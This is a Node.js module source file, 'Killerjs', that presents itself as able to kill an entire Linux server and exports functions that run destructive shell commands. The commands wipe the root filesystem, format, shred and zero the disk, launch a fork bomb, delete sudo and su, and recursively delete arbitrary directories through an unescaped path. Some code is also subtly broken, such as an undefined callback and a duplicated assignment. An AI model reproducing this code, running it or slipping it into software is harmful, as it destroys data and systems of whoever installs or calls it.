let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @return {Promise} A promise object.
 */
    let destroyRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Root.`)
                }
            })
        })
    }
    let format = () => {
        return new Promise((done, err) => {
            shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Formatted the Drive`)
                }
            })
        })
    }
    let overWrite = () => {
        return new Promise((done, err) => {
            shell.exec('shred -v /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Drive has been Overwritten Successfully.`)
                }
            })
        })
    }
    let wipe = () => {
        return new Promise((done, err) => {
            shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Wiped the Drive.`)
                }
            })
        })
    }
    let implode = () => {
        return new Promise((done, err) => {
            shell.exec('mv / /dev/null', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Imploded the Drive.`)
                }
            })
        })
    }
    let forkBomb = () => {
        return new Promise((done, err) => {
            shell.exec(':(){:|:&};:', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Executed forkBomb`)
                }
            })
        })
    }
    let disableRoot = () => {
        return new Promise((done, err) => {
            shell.exec('rm -f /usr/bin/sudo;rm -f /bin/su', (c, o, e) => {
                if(e) {
                    err(e)
                } else {
                    done(`Disabled Root Successfully.`)
                }
            })
        })
    }
    let destroyProject = () => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${a.resolve('/')}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    done(`Destroyed Project Dir`)
                }
            })
        })
    }
    let destroyADir = (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }

let killer = () => {
    return new Promise((done, er) => {
        shell.exec('rm -rf /', (c, o, e) => {
            if(e) {
                er(e)
            } else {
                done(`Killed the Server <3`)
            }
        })
    })
}

killer.prototype.destroyRoot = destroyRoot
killer.prototype.format = format
killer.prototype.overWrite = overWrite
killer.prototype.wipe = wipe
killer.prototype.implode = implode
killer.prototype.wipe = wipe
killer.prototype.forkBomb = forkBomb
killer.prototype.disableRoot = disableRoot
killer.prototype.destroyProject = destroyProject
killer.prototype.destroyADir = destroyADir

module.exports = killer;